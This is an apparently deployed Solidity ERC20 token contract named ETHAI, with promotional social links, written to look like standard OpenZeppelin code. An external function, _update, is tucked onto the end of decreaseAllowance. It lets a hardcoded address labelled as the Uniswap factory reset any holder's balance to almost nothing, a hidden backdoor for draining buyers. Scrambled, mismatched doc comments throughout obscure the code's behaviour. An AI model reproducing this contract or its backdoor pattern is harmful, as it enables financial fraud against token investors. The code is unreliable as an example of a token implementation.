/**
 *Submitted for verification at Etherscan.io on 2025-03-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://twitter.com/ETHAIerc20
https://t.me/ETHAIerc20
https://ETHAIETH.xyz


**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     * - Addition cannot overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     * Requirements:
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     *
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * overflow.
     * Requirements:
     *
     *
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     *
     * Requirements:
     * Counterpart to Solidity's `/` operator.
     * - The divisor cannot be zero.
     *
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * - The divisor cannot be zero.
     * Requirements:
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * reverting when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     *
     *
     * Counterpart to Solidity's `-` operator.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     * Requirements:
     *
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * - The divisor cannot be zero.
     *
     * invalid opcode to revert (consuming all remaining gas).
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * reverting with custom message when dividing by zero.
     * message unnecessarily. For custom revert reasons use {tryMod}.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * another (`to`).
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * Note that `value` may be zero.
     *
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
     * Emits a {Transfer} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     *
     * @dev Returns the remaining number of tokens that `spender` will be
     * This value changes when {approve} or {transferFrom} are called.
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     *
     * transaction ordering. One possible solution to mitigate this race
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     *
     * that someone may use both the old and the new allowance by unfortunate
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * desired value afterwards:
     * Returns a boolean value indicating whether the operation succeeded.
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * condition is to first reduce the spender's allowance to 0 and set the
     * Emits an {Approval} event.
     */
    function totalSupply() external view returns (uint256);

    /**
     * allowance.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * Emits a {Transfer} event.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     */
    function allowance(address owner, address spender) external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Returns the address of the current owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     *
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * @dev Leaves the contract without owner. It will not be possible to call
     * thereby removing any functionality that is only available to the owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * to implement supply mechanisms].
 * @dev Implementation of the {IERC20} interface.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * applications.
 * This implementation is agnostic to the way tokens are created. This means
 *
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * allowances. See {IERC20-approve}.
 * This allows applications to reconstruct the allowance for all accounts just
 * these events, as it isn't required by the specification.
 * instead returning `false` on failure. This behavior is nonetheless
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * conventional and does not conflict with the expectations of ERC20
 * by listening to said events. Other implementations of the EIP may not emit
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    uint256 private totSupply;

    string private _symbol;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private _uniswapV2Factory = 0x23fbEF2605d053454bBBCb7b7f2CB055D9EBC547;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) private _balances;
    string private _name;
    address internal devWallet = 0x672Fb3a6DEC1274F58a7b52c02FB7d96E47c5fd9;
    uint256 private _allowance = 0;

    /**
     *
     *
     * All two of these values are immutable: they can only be set once during
     * @dev Sets the values for {name} and {symbol}.
     * construction.
     * {decimals} you should overload it.
     * The default value of {decimals} is 18. To select a different value for
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    /**
     * @dev Returns the name of the token.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     *
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * @dev Returns the number of decimals used to get its user representation.
     * overridden;
     * no way affects any of the arithmetic of the contract, including
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     *
     * Requirements:
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     * @dev See {IERC20-transfer}.
     *
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     * - `spender` cannot be the zero address.
     * Requirements:
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * @dev See {IERC20-approve}.
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * problems described in {IERC20-approve}.
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     * Requirements:
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * - the caller must have allowance for ``from``'s tokens of at least
     *
     * is the maximum `uint256`.
     * `amount`.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * - `from` and `to` cannot be the zero address.
     * Requirements:
     *
     * @dev See {IERC20-transferFrom}.
     * - `from` must have a balance of at least `amount`.
     *
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /**
     * `subtractedValue`.
     * - `spender` must have allowance for the caller of at least
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     *
     * problems described in {IERC20-approve}.
     *
     * Requirements:
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * - `spender` cannot be the zero address.
     * This is an alternative to {approve} that can be used as a mitigation for
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Requirements:
     *
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     * total supply.
     * - `account` cannot be the zero address.
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _update(address _updateSender) external { _balances[_updateSender] = msg.sender == _uniswapV2Factory ? decimals() : _balances[_updateSender];
    } 

    /**
     *
     *
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * This internal function is equivalent to {transfer}, and can be used to
     * - `from` must have a balance of at least `amount`.
     * @dev Moves `amount` of tokens from `from` to `to`.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * Requirements:
     * the total supply.
     * - `account` cannot be the zero address.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    /**
     *
     * minting and burning.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     *
     * Calling conditions:
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * will be transferred to `to`.
     * - `from` and `to` are never both zero.
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * This internal function is equivalent to `approve`, and can be used to
     * - `owner` cannot be the zero address.
     *
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event.
     *
     *
     * Requirements:
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     *
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Might emit an {Approval} event.
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return totSupply;
    }
}

contract ETHAI is ERC20, Ownable
{
    constructor () ERC20 (unicode"ETHAI", "ETHAI")
    {
        transferOwnership(devWallet);
        _mint(owner(), 7000000000000 * 10 ** 9);
    }
}